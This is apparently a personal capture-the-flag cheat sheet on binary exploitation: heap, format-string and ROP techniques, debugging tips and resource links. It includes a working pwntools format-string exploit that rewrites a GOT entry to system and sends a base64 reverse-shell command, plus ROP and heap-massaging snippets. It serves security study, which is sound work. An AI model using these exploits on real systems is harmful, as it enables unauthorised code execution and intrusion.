# +

- [shell\-storm | Shellcodes Database](http://shell-storm.org/shellcode/)
- [libc database search](https://libc.blukat.me/)
- [GitHub \- niklasb/libc\-database: Build a database of libc offsets to simplify exploitation](https://github.com/niklasb/libc-database)
- [GitHub \- 0xb0bb/karkinos: A thorough library database to assist with binary exploitation tasks\.](https://github.com/0xb0bb/karkinos)
- memfd_create dropper to download/execute files in memory
    - https://github.com/netspooky/golfclub/blob/master/linux/dl_memfd_219.asm
    > header overlay in the fully assembled bin only works up to kernel 5.6, but you can just take all the elf header bits out and rebuild with nasm -f elf64

- https://bitvijays.github.io/LFC-BinaryExploitation.html
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
- [GitHub \- Naetw/CTF\-pwn\-tips: Here record some tips about pwn\. Something is obsoleted and won&\#39;t be updated\. Sorry about that\.](https://github.com/Naetw/CTF-pwn-tips)
- [GitHub \- leesh3288/WinPwn: Windows Pwnable Study](https://github.com/leesh3288/WinPwn)
- [GitHub \- wapiflapi/villoc: Visualization of heap operations\.](https://github.com/wapiflapi/villoc)

# methodology

```bash
# setup script for remote, local, and SSH pwnables
pwn template
./exploit.py LOCAL DEBUG GDB
```

- if: free reference not nulled
    - then: uaf
    - else: tcache poisoning
- if: no ASLR, stack address not known
    - then: use `jmp esp` trampoline

- `printf()`: 1st param => format string
    - if: len(arg) >= 65537, calls: `malloc()`, `free()`
- `strcpy()`: len(1st param) -lt len(2nd param) => buffer overflow
- `scanf()`: len(2nd param) -lt len(read bytes) => buffer overflow
- `gets(), memcpy(), strcat()`
> "scanf will quite happily read null bytes. it only stops at white space - strcpy/strcat are the functions you should worry about null bytes" -brx (This means we don't have to worry about the canary having null bytes)
    - [CTFtime\.org / Pragyan CTF 2019 / Armoury / Writeup](https://ctftime.org/writeup/13986)

- buffer size - check allocated frame for locals, take largest offset
- overwritten return address - jmp to infinite loop, if app hangs, it worked
- check if payload is malformed - set breakpoint (INT 3 == \xCC), if process doesn't stop, instructions up to breakpoint are malformed
- process io - use `mkfifo` + pwntools `gdb.attach()` to send payloads at specific points

### cyclic pattern

```bash
python3 -c 'from pwn import *; print(cyclic_gen(string.ascii_uppercase).get(32))'
```

### detection

- valgrind
- [libFuzzer – a library for coverage\-guided fuzz testing\. &\#8212; LLVM 12 documentation](http://llvm.org/docs/LibFuzzer.html)
- [GitHub \- strongcourage/uafuzz: UAFuzz: Binary\-level Directed Fuzzing for Use\-After\-Free Vulnerabilities](https://github.com/strongcourage/uafuzz)

# debugging

reading direction: on arrow end, goto next step; each pipe character (`|`) delimits byte

```gdb
pwndbg> x/32x 0x100000000
                <-|-|-|-|1      <-|-|-|-|2      <-|-|-|-|3      <-|-|-|-|4
0x100000000:    0x55554000      0x00005555      0x557a2020      0x00005555
```

validate against byte values:

```gdb
pwndbg> x/cx 0x100000000
0x100000000:    0x00
pwndbg> x/cx 0x100000001
0x100000001:    0x40
pwndbg> x/cx 0x100000002
0x100000002:    0x55
pwndbg> x/cx 0x100000003
0x100000003:    0x55
[...]
pwndbg> x/cx 0x100000008
0x100000008:    0x20
pwndbg> x/cx 0x100000009
0x100000009:    0x20
pwndbg> x/cx 0x10000000a
0x10000000a:    0x7a
pwndbg> x/cx 0x10000000b
0x10000000b:    0x55
[...]
```

last specific type is retained on ambiguous commands, need to be specific again to rollback type change:

```gdb
pwndbg> x/32x 0x100000000
0x100000000:    0x00    0x40    0x55    0x55    0x55    0x55    0x00    0x00
0x100000008:    0x20    0x20    0x7a    0x55    0x55    0x55    0x00    0x00
0x100000010:    0x00    0xb0    0xff    0xf7    0xff    0x7f    0x00    0x00
0x100000018:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
pwndbg> x/32xw 0x100000000
0x100000000:    0x55554000      0x00005555      0x557a2020      0x00005555
0x100000010:    0xf7ffb000      0x00007fff      0x00000000      0x00000000
0x100000020:    0x00000000      0x00000000      0x00000000      0x00000000
0x100000030:    0x00000000      0x00000000      0x00000000      0x00000000
0x100000040:    0x00000000      0x00000000      0x00000000      0x00000000
0x100000050:    0x00000000      0x00000000      0x00000000      0x00000000
0x100000060:    0x00000000      0x00000000      0x00000000      0x00000000
0x100000070:    0x00000000      0x00000000      0x00000000      0x00000000
```

storing values in locals

```
0x555555555482    mov    byte ptr [rbp - 0x20], 0xbe
0x555555555486    mov    byte ptr [rbp - 0x1f], 0x43
[...]
0x5555555554b2    mov    byte ptr [rbp - 0x14], 0x6e
0x5555555554b6    mov    byte ptr [rbp - 0x13], 0x51
0x5555555554ba    mov    byte ptr [rbp - 0x12], 0xc
0x5555555554be    mov    byte ptr [rbp - 0x11], 0x20
0x5555555554c2    mov    byte ptr [rbp - 0x10], 0

pwndbg> x/32x $rbp - 0x20
0x7fffffffd058: 0x3a1a43be      0xee93c71a      0x3c777f5a      0x200c516e
0x7fffffffd068: 0x00000000      0x00000000      0x38e02000      0x5c4c9d39
```

# symbols

```bash
# Redress libc with debug symbols
eu-unstrip "$stripped_libc" "$symbol_file"
```

# stack overflow

- heap spraying - multiple instances of NOP slide + shellcode concatenated => high chance of jumping to shellcode when returning to stack address
    - https://github.com/datajerk/ctf-write-ups/tree/master/cybersecurityrumblectf2020/babypwn
        - ~/code/snippets/ctf/pwn/csrctf2020-babypwn.py
    - [Smashing The Stack For Fun And Profit](http://www.phrack.org/issues/49/14.html#article)
- syscall alternatives: `execveat()`

### leak stack address

- if: leaked libc base address + can leak arbitrary address
    - dereference libc base + offset of symbol `environ`
    - https://github.com/Naetw/CTF-pwn-tips#leak-stack-address

# One-Gadget RCE

- if: leaked libc base address + control $rip
    - overwrite `.got.plt` with address of `execve(["/bin/sh/"])` gadget from libc's `system()`
    - https://github.com/david942j/one_gadget
    - http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf

# use-after-free (UAF)

1. allocate `object foo1` with reference to address `bar1`, `array foo` points to object
2. deallocate `object foo1`, `array foo` preserves pointer to object's address
3. allocate `object foo2` with reference `bar2` to same address as deallocated `object foo1` (aka. heap massaging)
4. `array foo` (with dangling pointer) dereferences controlled address `bar2` written by `object foo2`, not an object
    - if program reads from address, access value in arbitrary address previously unreadable (aka. memory leak)
    - if program writes to address, write-what-where in stack for rop

- ! std::string uses in-object buffer for small strings, allocates memory for larger strings
    - => control whether allocations are triggered
- ! memory manager keeps linked-list of most recently freed address to allocate next objects

```cpp
std::string x{"AAAA"}
printf("%zu\n", sizeof(x));
fwrite(&x, 1, sizeof(x), stdout);
// Outputs object with string value

std::string x{"AAAABBBBCCCCDDDD"}
printf("%zu\n", sizeof(x));
fwrite(&x, 1, sizeof(x), stdout);
// Outputs object without string value
```

Heap massaging:

- run with `socat tcp-listen:31337,reuseaddr exec:"ltrace -e malloc -e free ./foo"`
- || guess layout:

```python
for i in range(20):
    if i % 3 == 0:
        add_book(s, "A" * 39, 600)
    else:
        add_book(s, "A" + str(i), 600)
    s.recvuntil("Choice?")

for i in range(2, 20, 2):
    add_fav(s, i + 1)
    s.recvuntil("Choice?")

for i in range(2, 20, 2):
    delete book(s, i + 1)

exp = add_book(s, "A" * 39, 600)
s.recvuntil("Choice?")
```

Check controlled registers: 

- e.g. look for `0x41414141`

References:

- [Hacking Livestream \#48: Use\-after\-free \- YouTube](https://www.youtube.com/watch?v=zJw7CuSc8Sg)
    - https://github.com/gynvael/stream-en

# tcache poisoning

https://pwn-maher.blogspot.com/2020/11/pwn10-heap-exploitation-for-glibc-232.html

# write-what-where

- `_hook` functions:
    - FULL RELRO is enabled/GOT is read-only
    - https://github.com/OpenToAllCTF/Tips#_hooks

# format string

Reading:

1. Find 1st pattern in leaked addresses
    ```python
    # 32bit
    fmt_str = "AAAA" + ".%x" * 128
    # take returned values
    x = x.split('.')
    x.index('41414141')
    ```

2. Read at address index 123: `%123$s`

Writing:

```python
from pwn import *
import requests
from urllib.parse import quote

context (arch='i686', os='Linux')

RHOST = '127.0.0.1'
RPORT = '9999'

def getFile(file):
    header = { "Range" : "bytes=0-4096"}
    r = requests.get(f"http://{RHOST}:{RPORT}/{file}", headers=header)
    return r.text

# Step 1. Find Addresses
log.info("Finding Binary/LibC Location via /proc/self/maps")
maps = getFile("/proc/self/maps")
addr_bin = maps.split('\n')[0][:8]
addr_libc = maps.split('\n')[6][:8]
log.success(f"Binary is at: 0x{addr_bin}")
log.success(f"Libc is at: 0x{addr_libc}")

# Step 2. Calculate Offsets, Validate first with localhost libc
log.info("Finding the address of PUTS + SYSTEM()")
elf = ELF("./httpserver", checksec=False)
libc = ELF("./libc.so.6.32.self", checksec=False)
elf.address = int(addr_bin, 16)
libc.address = int(addr_libc, 16)
got_puts = elf.got['puts']
system = libc.symbols['system']
log.success(f"Puts@GOT: {hex(got_puts)}")
log.success(f"System@LIBC: {hex(system)}")

# Step 3. Overwrite PUTS with SYSTEM()
log.info("Using printf[53] to remap PUTS > SYSTEM")
payload = fmtstr_payload(53, {got_puts : system} )
r = remote(RHOST, RPORT)
# Bash rev shell
base64_rev_shell = "..."
cmd = "echo${IFS}" + base64_rev_shell + "{$IFS}|${IFS}base64${IFS}-d${IFS}|bash"
r.sendline(f"{cmd} {quote(payload)} HTTP/1.1\r\n")
r.close()
```

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example/

# return-oriented programming (rop)

1. leak stack canary: Given multiple requests for same process, blast (i.e. bruteforce) bytes from boolean-based response
    - repeat for $rbp, then $rip
    - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/#one-by-one-crack-canary
    - if: read and print beyond variable
        - overwrite null byte of canary

2. leak base address, map: $rip == rebasing ELF (allows leaking GOT addresses)
    - ~/code/snippets/ctf/pwn/rop.py
    - Alternative: manual chain
    ```bash
    ropper --search "pop r??"
    # foreach address (= offset): p64(address + base_address)

    objdump -D _
    # take PLT for write()

    readelf -r _
    # take GOT for write()

    strings -atx libc | grep -i '/bin/sh'
    # take p64(address + base_address)
    ```
    ```python
    # leak write@libc
    # fd = 0x0: reuse previous fd
    rop = pop_rsi_r15 + got_write + p64(0x0)
    rop += pop_rdx + p64(0x8)
    rop += plt_write
    ```

- [HackTheBox \- Rope](https://www.youtube.com/watch?v=GTQxZlr5yvE)

# sigreturn-oriented programming (srop)

TODO

# windows

- mitigations
    - canary == /GS - stack cookies
    - NX == /NX_COMPAT - data execution prevention (DEP)
        - attacks: change some GOT address to WinExec() (xref. return2libc), call ntdll.dll function that disables DEP, call VirtualProtect() to allow execution in heap
        - alternative to VirtualProtect() in kernel mode: ZwProtectVirtualMemory()
            - [ZwAllocateVirtualMemory routine \(Windows Drivers\) \| Microsoft Docs](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566416%28v=vs.85%29.aspx)
    - ASLR == /DYNAMIC_BASE
        - https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization?view=msvc-160
        - disable with `setdllcharacteristics -d foo.exe`
            - https://blog.didierstevens.com/2010/10/17/setdllcharacteristics/amp/
            - https://github.com/guywhataguy/DisableDynamicLoadAddress

- [FuzzySecurity \| Windows ExploitDev: Part 11](https://fuzzysecurity.com/tutorials/expDev/15.html)
